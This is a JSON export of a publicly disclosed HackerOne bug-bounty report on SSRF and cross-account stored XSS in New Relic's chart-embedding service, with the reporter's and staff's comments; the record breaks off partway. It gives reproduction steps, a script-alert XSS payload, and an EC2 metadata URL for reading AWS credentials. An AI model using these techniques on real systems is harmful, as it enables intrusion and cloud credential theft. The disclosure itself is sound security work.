@@ -1,0 +1,725 @@
+{
+  "id": 708589,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MDg1ODk=",
+  "url": "https://hackerone.com/reports/708589",
+  "title": "Unsafe charts embedding implementation leads to cross-account stored XSS and SSRF",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-10-06T15:58:35.542Z",
+  "submitted_at": "2019-10-06T15:58:35.542Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "skavans",
+    "url": "/skavans",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 17011,
+    "url": "https://hackerone.com/newrelic",
+    "handle": "newrelic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "New Relic",
+      "twitter_handle": "newrelic",
+      "website": "https://newrelic.com",
+      "about": "New Relic's Coordinated Disclosure Program"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-08-13T11:06:30.769Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-08-11T09:34:43.156Z",
+  "team_member_agreed_on_going_public_at": "2020-08-13T11:06:30.662Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hey team,\n\nI've discovered an improper user-input filtration issue at charts embedding (herald.service.newrelic.com) leading to both cross-account stored XSS and SSRF.\n\nThere is an action `Get chart link` for some charts (for instance, for the ones located at Mobile -> Overview).\n{F600887}\nAfter user clicks this link, the following request is sent:\n```http\nPUT /charts HTTP/1.1\nHost: herald.service.newrelic.com\n<redacted>\n\n{\"account_id\":2385914,\"chart_type\":\"area\",\"metadata\":{\"title\":\"Crashes\",\"subtitle\":\"test\"},\"endpoint\":\"/v2/nrql\",\"query\":{\"account_id\":2385914,\"nrql\":\"SELECT count(*) FROM MobileCrash WHERE (appId = 194687300 OR appVersionId = 194687300) WHERE crashFingerprint NOT IN () FACET `appVersion` TIMESERIES SINCE 3 days AGO LIMIT 5\"}}\n```\nAt this step, the server saves the `endpoint` and `query` params to the database, and returns back the UUID of created publicly-available chart:\n```http\nHTTP/1.1 201 Created\n<redacted>\nLocation: /charts/501c881b-7317-47a1-b2df-16f83fb0bb8d\n<redacted>\n```\nThen, when a user visits page\n`https://chart-embed.service.newrelic.com/herald/501c881b-7317-47a1-b2df-16f83fb0bb8d`\nto see an embedded chart, the browser sends one more request to\n`https://herald.service.newrelic.com/charts/501c881b-7317-47a1-b2df-16f83fb0bb8d/data`\nto receive the chart data.\n\n**Here is where an issue lies.** When the `.../data` request is processed by server, the server gets the corresponding `endpoint` and `query` params from the database, **makes an HTTP POST request** to this endpoint (with all the parameters from `query` parameter) and returns its content back to user. The vulnerability itself is that the server do not properly checks the `endpoint` parameter before save it to the database, and **attacker can submit the external URL here**.\n\nThus, an attacker can:\n- interact with your internal network (through submitting the `localhost` URL or some other internal one) by sending arbitrary POST requests to it;\n- craft malicious URL `https://herald.service.newrelic.com/charts/501c881b-7317-47a1-b2df-16f83fb0bb8d/data` which returns arbitrary HTML from external malicious resource, which leads to stored XSS in its turn.\n\n##Steps to reproduce\n1) Sign into Mobile\n2) Navigate to any app -> Overview\n3) Click the \"three dots\" near any chart (it even can be empty), choose the `Get chart link` menu item, and intercept the PUT-request to `https://herald.service.newrelic.com/charts` with Burp\n**SSRF**\n4) Change the `endpoint` parameter to `//localhost` and send the request\n5) Copy the created chart ID from response `Location` header\n6) Navigate to `https://herald.service.newrelic.com/charts/<CHART_ID>/data` and make sure the response contains the content of some webserver running at the herald VM at 80 port:\n{F600890}\nIf you submit some closed port, the response will be 404.\n**XSS**\n4) Place an HTML-file with the following content at some internet (external) webserver:\n```html\n<script>alert(document.domain)</script>\n```\nYou can use the file, I'm serving myself: https://xn--1xa.su/xss.html \n5) Change the `endpoint` parameter to your payload file location (`//xn--1xa.su/xss.html`) and send the request\n6) Copy the created chart ID from response `Location` header\n7) Navigate to `https://herald.service.newrelic.com/charts/<CHART_ID>/data` and make sure the XSS payload is executed:\n{F600895}\nIt's severe that an attacker can send this malicious link to any user from any account and the XSS payload will fire, so it's **cross-account stored XSS**.\n\n##PoC video\n{F600905}\n\n## Impact\n\n- Full-fledged SSRF with ability to send arbitrary POST-requests to internal hosts\n- Cross-account stored XSS",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 600887,
+      "file_name": "______________2019-10-06___18.03.48.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/j84AZFN3zS4kYfKqmuNw7Ra3?response-content-disposition=attachment%3B%20filename%3D%22______________2019-10-06___18.03.48.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-10-06___18.03.48.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7IF72EGR%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072526Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJIMEYCIQD0TAEi1peTsxNRMRsx2vBHR2pUGB7uHpbMRYg22KJXXAIhAOfNKRDia06ZOZMyd%2Fls3%2FTdPcLekbPiNmiZSXFYcx5uKrEFCCgQAxoMMDEzNjE5Mjc0ODQ5IgwjRpsfqQF%2BFfykAFMqjgXdivFzeRynUaxnCxzNhWzgVNVya2lqgNeJCfGD3wMjYG5xSgEab7GM4w5o9oGAL8%2BfjsZ7blKNrUlARcDh6fKoJ4rUV9jhNZz%2FvPSgXu6wzQtWtT5a2Ana5wpZSTzm8K62COIpOoBhJTTkJTT%2FdALIxUIidxqFRrLKAi89qr9bgJyQDu33TMI14lRF%2Bvauvx%2Bl9XKOvUSvEFRVuXhxrd%2FQ2SR68RCv05i8EW6Rw11j76ipoSR9CW95fmmNJg%2FEV4hGCi%2FyNDsBu4CQ2GM3PH2T%2ByfbJw85lnD6T%2Bcos3FcMzWc%2BVDZLk2j5FrFa0YExa9%2BN8LdhGVphEYnfjt9OFFnxcoC%2BnrZCSna21kk9sD1g0D8YjpQnNJmMJP%2BnOM7I%2Fk%2F77n4v30KuuC6hpT8twhDKILhks8yAwVuiyDBLgEMMdV1PeuUZFokagw0ONgLFZMZ5ElGYijYV8Dv0UlVGFJRzrpaxVl2Dy%2FWWgy0XMx%2FwG5k95kd%2FLkZ7w7o0%2FM%2FDJToli3C27uWWejCiuq95TXpXKCEzEWb0J4rh29e4hk7hq7OWOtQQTUde2q9wchyksu1rYzq2RCV2gM10O1mMJunqQSg6lES7Z5AvaCVheBpt2uRDsodnl9KD2I3VWF0kgJXSmcDVcQ4UxMShaao7WC7bcYWs%2BIjKN6C9mY9CzgacHoYHms6kZzPz2NrN%2F3cHhxk0zzINkWgZhR8IaHWOGyuyiZIbmQ2sv86YBVwYSb0hQj6n4rBtD8jilSYSnBbvxlJnRSCSIaYwiHuOcQhzmmbIT4pWyAbV4%2FmXomyu0ZvHzcxJiqRiIaBq0fx4B8qyvHCZ0MAWnqCAAlgmS%2BHlRuvxigPCB4nXZ59bhSNtaQw6pq6qAY6sAHlFHUDOcxyHvFiK44%2BbKKoa8xJyrD9kvKV1skKJvix2qkHIcCQAaIne5%2FQOqOFhO25Mu%2BP%2FIg08%2BZTLOQt7xdkt%2FsKZut84hBLHJYAq9vY1kXUeIPQ1avQ9%2FT2wWy9L5CTYbnxh26j%2Bo3NcBtG0oDQg%2BqPGSdORofiFd9dZKqJouuppKCv20%2FFJzBNvMZPpqAVejqiWUAwyYGwtPQUNvmJniwGk0kv1X8Rcycp1eaOEg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1c36d38c2a1931c7d27acb774c917f11fd80940455f3a642a57417d7449a4336",
+      "file_size": 139701,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 600890,
+      "file_name": "______________2019-10-06___18.17.04.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6zxX6LbXf1wdhaSNVges6vcW?response-content-disposition=attachment%3B%20filename%3D%22______________2019-10-06___18.17.04.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-10-06___18.17.04.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7IF72EGR%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072526Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJIMEYCIQD0TAEi1peTsxNRMRsx2vBHR2pUGB7uHpbMRYg22KJXXAIhAOfNKRDia06ZOZMyd%2Fls3%2FTdPcLekbPiNmiZSXFYcx5uKrEFCCgQAxoMMDEzNjE5Mjc0ODQ5IgwjRpsfqQF%2BFfykAFMqjgXdivFzeRynUaxnCxzNhWzgVNVya2lqgNeJCfGD3wMjYG5xSgEab7GM4w5o9oGAL8%2BfjsZ7blKNrUlARcDh6fKoJ4rUV9jhNZz%2FvPSgXu6wzQtWtT5a2Ana5wpZSTzm8K62COIpOoBhJTTkJTT%2FdALIxUIidxqFRrLKAi89qr9bgJyQDu33TMI14lRF%2Bvauvx%2Bl9XKOvUSvEFRVuXhxrd%2FQ2SR68RCv05i8EW6Rw11j76ipoSR9CW95fmmNJg%2FEV4hGCi%2FyNDsBu4CQ2GM3PH2T%2ByfbJw85lnD6T%2Bcos3FcMzWc%2BVDZLk2j5FrFa0YExa9%2BN8LdhGVphEYnfjt9OFFnxcoC%2BnrZCSna21kk9sD1g0D8YjpQnNJmMJP%2BnOM7I%2Fk%2F77n4v30KuuC6hpT8twhDKILhks8yAwVuiyDBLgEMMdV1PeuUZFokagw0ONgLFZMZ5ElGYijYV8Dv0UlVGFJRzrpaxVl2Dy%2FWWgy0XMx%2FwG5k95kd%2FLkZ7w7o0%2FM%2FDJToli3C27uWWejCiuq95TXpXKCEzEWb0J4rh29e4hk7hq7OWOtQQTUde2q9wchyksu1rYzq2RCV2gM10O1mMJunqQSg6lES7Z5AvaCVheBpt2uRDsodnl9KD2I3VWF0kgJXSmcDVcQ4UxMShaao7WC7bcYWs%2BIjKN6C9mY9CzgacHoYHms6kZzPz2NrN%2F3cHhxk0zzINkWgZhR8IaHWOGyuyiZIbmQ2sv86YBVwYSb0hQj6n4rBtD8jilSYSnBbvxlJnRSCSIaYwiHuOcQhzmmbIT4pWyAbV4%2FmXomyu0ZvHzcxJiqRiIaBq0fx4B8qyvHCZ0MAWnqCAAlgmS%2BHlRuvxigPCB4nXZ59bhSNtaQw6pq6qAY6sAHlFHUDOcxyHvFiK44%2BbKKoa8xJyrD9kvKV1skKJvix2qkHIcCQAaIne5%2FQOqOFhO25Mu%2BP%2FIg08%2BZTLOQt7xdkt%2FsKZut84hBLHJYAq9vY1kXUeIPQ1avQ9%2FT2wWy9L5CTYbnxh26j%2Bo3NcBtG0oDQg%2BqPGSdORofiFd9dZKqJouuppKCv20%2FFJzBNvMZPpqAVejqiWUAwyYGwtPQUNvmJniwGk0kv1X8Rcycp1eaOEg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=55ef2f70d980dd98860a56cd546f291ced0b52a3334c1a6476be4cd70bc0681b",
+      "file_size": 76120,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 600895,
+      "file_name": "______________2019-10-06___18.24.14.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/YJrzsTLvwQF8oT4TGAsmMSAj?response-content-disposition=attachment%3B%20filename%3D%22______________2019-10-06___18.24.14.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-10-06___18.24.14.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7IF72EGR%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072526Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJIMEYCIQD0TAEi1peTsxNRMRsx2vBHR2pUGB7uHpbMRYg22KJXXAIhAOfNKRDia06ZOZMyd%2Fls3%2FTdPcLekbPiNmiZSXFYcx5uKrEFCCgQAxoMMDEzNjE5Mjc0ODQ5IgwjRpsfqQF%2BFfykAFMqjgXdivFzeRynUaxnCxzNhWzgVNVya2lqgNeJCfGD3wMjYG5xSgEab7GM4w5o9oGAL8%2BfjsZ7blKNrUlARcDh6fKoJ4rUV9jhNZz%2FvPSgXu6wzQtWtT5a2Ana5wpZSTzm8K62COIpOoBhJTTkJTT%2FdALIxUIidxqFRrLKAi89qr9bgJyQDu33TMI14lRF%2Bvauvx%2Bl9XKOvUSvEFRVuXhxrd%2FQ2SR68RCv05i8EW6Rw11j76ipoSR9CW95fmmNJg%2FEV4hGCi%2FyNDsBu4CQ2GM3PH2T%2ByfbJw85lnD6T%2Bcos3FcMzWc%2BVDZLk2j5FrFa0YExa9%2BN8LdhGVphEYnfjt9OFFnxcoC%2BnrZCSna21kk9sD1g0D8YjpQnNJmMJP%2BnOM7I%2Fk%2F77n4v30KuuC6hpT8twhDKILhks8yAwVuiyDBLgEMMdV1PeuUZFokagw0ONgLFZMZ5ElGYijYV8Dv0UlVGFJRzrpaxVl2Dy%2FWWgy0XMx%2FwG5k95kd%2FLkZ7w7o0%2FM%2FDJToli3C27uWWejCiuq95TXpXKCEzEWb0J4rh29e4hk7hq7OWOtQQTUde2q9wchyksu1rYzq2RCV2gM10O1mMJunqQSg6lES7Z5AvaCVheBpt2uRDsodnl9KD2I3VWF0kgJXSmcDVcQ4UxMShaao7WC7bcYWs%2BIjKN6C9mY9CzgacHoYHms6kZzPz2NrN%2F3cHhxk0zzINkWgZhR8IaHWOGyuyiZIbmQ2sv86YBVwYSb0hQj6n4rBtD8jilSYSnBbvxlJnRSCSIaYwiHuOcQhzmmbIT4pWyAbV4%2FmXomyu0ZvHzcxJiqRiIaBq0fx4B8qyvHCZ0MAWnqCAAlgmS%2BHlRuvxigPCB4nXZ59bhSNtaQw6pq6qAY6sAHlFHUDOcxyHvFiK44%2BbKKoa8xJyrD9kvKV1skKJvix2qkHIcCQAaIne5%2FQOqOFhO25Mu%2BP%2FIg08%2BZTLOQt7xdkt%2FsKZut84hBLHJYAq9vY1kXUeIPQ1avQ9%2FT2wWy9L5CTYbnxh26j%2Bo3NcBtG0oDQg%2BqPGSdORofiFd9dZKqJouuppKCv20%2FFJzBNvMZPpqAVejqiWUAwyYGwtPQUNvmJniwGk0kv1X8Rcycp1eaOEg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=dfd6c788f16f36f2b928f63e5d0a08ab155dbb96ec52ef2c9bab3510741c32d5",
+      "file_size": 125455,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 600905,
+      "file_name": "charts_embedded_ssrf_and_xss.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Rgqv7kZVaMQGWbkrQ6J4ee8s?response-content-disposition=attachment%3B%20filename%3D%22charts_embedded_ssrf_and_xss.mp4%22%3B%20filename%2A%3DUTF-8%27%27charts_embedded_ssrf_and_xss.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7IF72EGR%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072526Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJIMEYCIQD0TAEi1peTsxNRMRsx2vBHR2pUGB7uHpbMRYg22KJXXAIhAOfNKRDia06ZOZMyd%2Fls3%2FTdPcLekbPiNmiZSXFYcx5uKrEFCCgQAxoMMDEzNjE5Mjc0ODQ5IgwjRpsfqQF%2BFfykAFMqjgXdivFzeRynUaxnCxzNhWzgVNVya2lqgNeJCfGD3wMjYG5xSgEab7GM4w5o9oGAL8%2BfjsZ7blKNrUlARcDh6fKoJ4rUV9jhNZz%2FvPSgXu6wzQtWtT5a2Ana5wpZSTzm8K62COIpOoBhJTTkJTT%2FdALIxUIidxqFRrLKAi89qr9bgJyQDu33TMI14lRF%2Bvauvx%2Bl9XKOvUSvEFRVuXhxrd%2FQ2SR68RCv05i8EW6Rw11j76ipoSR9CW95fmmNJg%2FEV4hGCi%2FyNDsBu4CQ2GM3PH2T%2ByfbJw85lnD6T%2Bcos3FcMzWc%2BVDZLk2j5FrFa0YExa9%2BN8LdhGVphEYnfjt9OFFnxcoC%2BnrZCSna21kk9sD1g0D8YjpQnNJmMJP%2BnOM7I%2Fk%2F77n4v30KuuC6hpT8twhDKILhks8yAwVuiyDBLgEMMdV1PeuUZFokagw0ONgLFZMZ5ElGYijYV8Dv0UlVGFJRzrpaxVl2Dy%2FWWgy0XMx%2FwG5k95kd%2FLkZ7w7o0%2FM%2FDJToli3C27uWWejCiuq95TXpXKCEzEWb0J4rh29e4hk7hq7OWOtQQTUde2q9wchyksu1rYzq2RCV2gM10O1mMJunqQSg6lES7Z5AvaCVheBpt2uRDsodnl9KD2I3VWF0kgJXSmcDVcQ4UxMShaao7WC7bcYWs%2BIjKN6C9mY9CzgacHoYHms6kZzPz2NrN%2F3cHhxk0zzINkWgZhR8IaHWOGyuyiZIbmQ2sv86YBVwYSb0hQj6n4rBtD8jilSYSnBbvxlJnRSCSIaYwiHuOcQhzmmbIT4pWyAbV4%2FmXomyu0ZvHzcxJiqRiIaBq0fx4B8qyvHCZ0MAWnqCAAlgmS%2BHlRuvxigPCB4nXZ59bhSNtaQw6pq6qAY6sAHlFHUDOcxyHvFiK44%2BbKKoa8xJyrD9kvKV1skKJvix2qkHIcCQAaIne5%2FQOqOFhO25Mu%2BP%2FIg08%2BZTLOQt7xdkt%2FsKZut84hBLHJYAq9vY1kXUeIPQ1avQ9%2FT2wWy9L5CTYbnxh26j%2Bo3NcBtG0oDQg%2BqPGSdORofiFd9dZKqJouuppKCv20%2FFJzBNvMZPpqAVejqiWUAwyYGwtPQUNvmJniwGk0kv1X8Rcycp1eaOEg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2744d4ae88c5ca6e259f7fabdb45add0b52d74ae4bdee1b7dc730106112c734e",
+      "file_size": 15273559,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-09-10T09:34:43.194Z",
+  "allow_singular_disclosure_after": -95723442.95745006,
+  "singular_disclosure_allowed": true,
+  "vote_count": 224,
+  "voters": [
+    "oxecho",
+    "madinmars",
+    "wi11",
+    "zzero",
+    "grimnir",
+    "omarelfarsaoui",
+    "dninjadave",
+    "xploiterr",
+    "p1stachios",
+    "fqdn",
+    "and 214 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 4405,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.newrelic.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 5970676,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "You can submit the following URL as `endpoint`:\n`//169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\nand then see that attacker can interact with your internal Amazon EC2 API, read your secret access key and token:\n{F600912}\nThe \"AccessKeyId\", \"SecretAccessKey\" and \"Token\" then could be use to **gain full access to your AWS/EC2**, manage your VMs and so on. Thus, the **severity maybe should be bumped up**, but it's only your decision of course.\nYou can read further about severity of this issue here:\nhttps://medium.com/poka-techblog/privilege-escalation-in-the-cloud-from-ssrf-to-global-account-administrator-fd943cf5a2f6",
+      "automated_response": false,
+      "created_at": "2019-10-06T16:16:37.871Z",
+      "updated_at": "2019-10-06T16:25:05.216Z",
+      "actor": {
+        "username": "skavans",
+        "cleared": false,
+        "verified": false,
+        "url": "/skavans",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 600912,
+          "filename": "______________2019-10-06___19.15.50.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6JJfwrFFMN1unfRJRDGvFjPz?response-content-disposition=attachment%3B%20filename%3D%22______________2019-10-06___19.15.50.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-10-06___19.15.50.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7IF72EGR%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072526Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJIMEYCIQD0TAEi1peTsxNRMRsx2vBHR2pUGB7uHpbMRYg22KJXXAIhAOfNKRDia06ZOZMyd%2Fls3%2FTdPcLekbPiNmiZSXFYcx5uKrEFCCgQAxoMMDEzNjE5Mjc0ODQ5IgwjRpsfqQF%2BFfykAFMqjgXdivFzeRynUaxnCxzNhWzgVNVya2lqgNeJCfGD3wMjYG5xSgEab7GM4w5o9oGAL8%2BfjsZ7blKNrUlARcDh6fKoJ4rUV9jhNZz%2FvPSgXu6wzQtWtT5a2Ana5wpZSTzm8K62COIpOoBhJTTkJTT%2FdALIxUIidxqFRrLKAi89qr9bgJyQDu33TMI14lRF%2Bvauvx%2Bl9XKOvUSvEFRVuXhxrd%2FQ2SR68RCv05i8EW6Rw11j76ipoSR9CW95fmmNJg%2FEV4hGCi%2FyNDsBu4CQ2GM3PH2T%2ByfbJw85lnD6T%2Bcos3FcMzWc%2BVDZLk2j5FrFa0YExa9%2BN8LdhGVphEYnfjt9OFFnxcoC%2BnrZCSna21kk9sD1g0D8YjpQnNJmMJP%2BnOM7I%2Fk%2F77n4v30KuuC6hpT8twhDKILhks8yAwVuiyDBLgEMMdV1PeuUZFokagw0ONgLFZMZ5ElGYijYV8Dv0UlVGFJRzrpaxVl2Dy%2FWWgy0XMx%2FwG5k95kd%2FLkZ7w7o0%2FM%2FDJToli3C27uWWejCiuq95TXpXKCEzEWb0J4rh29e4hk7hq7OWOtQQTUde2q9wchyksu1rYzq2RCV2gM10O1mMJunqQSg6lES7Z5AvaCVheBpt2uRDsodnl9KD2I3VWF0kgJXSmcDVcQ4UxMShaao7WC7bcYWs%2BIjKN6C9mY9CzgacHoYHms6kZzPz2NrN%2F3cHhxk0zzINkWgZhR8IaHWOGyuyiZIbmQ2sv86YBVwYSb0hQj6n4rBtD8jilSYSnBbvxlJnRSCSIaYwiHuOcQhzmmbIT4pWyAbV4%2FmXomyu0ZvHzcxJiqRiIaBq0fx4B8qyvHCZ0MAWnqCAAlgmS%2BHlRuvxigPCB4nXZ59bhSNtaQw6pq6qAY6sAHlFHUDOcxyHvFiK44%2BbKKoa8xJyrD9kvKV1skKJvix2qkHIcCQAaIne5%2FQOqOFhO25Mu%2BP%2FIg08%2BZTLOQt7xdkt%2FsKZut84hBLHJYAq9vY1kXUeIPQ1avQ9%2FT2wWy9L5CTYbnxh26j%2Bo3NcBtG0oDQg%2BqPGSdORofiFd9dZKqJouuppKCv20%2FFJzBNvMZPpqAVejqiWUAwyYGwtPQUNvmJniwGk0kv1X8Rcycp1eaOEg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5fdaa2b6aa80803144a62cb8184cdba5cda6e8e2e01db1d222afff2d29d4c31c"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 5970768,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Just navigate here to see all the Amazon secrets, which could be leaked:\nhttps://herald.service.newrelic.com/charts/19bf02a1-d9e4-4dac-8b43-d47d5c78405e/data",
+      "automated_response": false,
+      "created_at": "2019-10-06T16:52:57.977Z",
+      "updated_at": "2019-10-06T16:53:25.864Z",
+      "actor": {
+        "username": "skavans",
+        "cleared": false,
+        "verified": false,
+        "url": "/skavans",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 5975726,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey team,\n\nI was wrong a little here:\n> The \"AccessKeyId\", \"SecretAccessKey\" and \"Token\" then could be use to gain full access to your AWS/EC2, manage your VMs and so on.\n\nActually, the things attacker can do with these keys depend on the vulnerable app permissions. So attacker can gain all permissions, the application have. \nI'll try to check this app permissions and notify you about my research.",
+      "automated_response": false,
+      "created_at": "2019-10-07T11:28:03.352Z",
+      "updated_at": "2019-10-07T11:32:04.770Z",
+      "actor": {
+        "username": "skavans",
+        "cleared": false,
+        "verified": false,
+        "url": "/skavans",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 5975839,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I think it can be possibly escalated up to RCE, but I should research this further.\nP.S.: It's tricky a little because I'm not familiar with AWS API, so it can take a while.\n\nIf you don't need for my deeper diving, please let me know.",
+      "automated_response": false,
+      "created_at": "2019-10-07T11:43:55.502Z",
+      "updated_at": "2019-10-07T11:47:01.100Z",
+      "actor": {
+        "username": "skavans",
+        "cleared": false,
+        "verified": false,
+        "url": "/skavans",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 5978804,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @skavans,\n\nThanks for your report.\n\nWe're taking a look at this now, please refrain from any additional testing. We'll let you know as soon as we've forwarded this to our engineering teams.",
+      "automated_response": false,
+      "created_at": "2019-10-07T16:54:43.046Z",
+      "updated_at": "2019-10-07T16:54:43.046Z",
+      "actor": {
+        "username": "nr-dm",
+        "cleared": false,
+        "verified": false,
+        "url": "/nr-dm",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 5978815,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey @dmcmahon,\n\nSure! Just let me know if some assistance is needed.",
+      "automated_response": false,
+      "created_at": "2019-10-07T16:55:46.318Z",
+      "updated_at": "2019-10-07T16:55:46.318Z",
+      "actor": {
+        "username": "skavans",
+        "cleared": false,
+        "verified": false,
+        "url": "/skavans",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
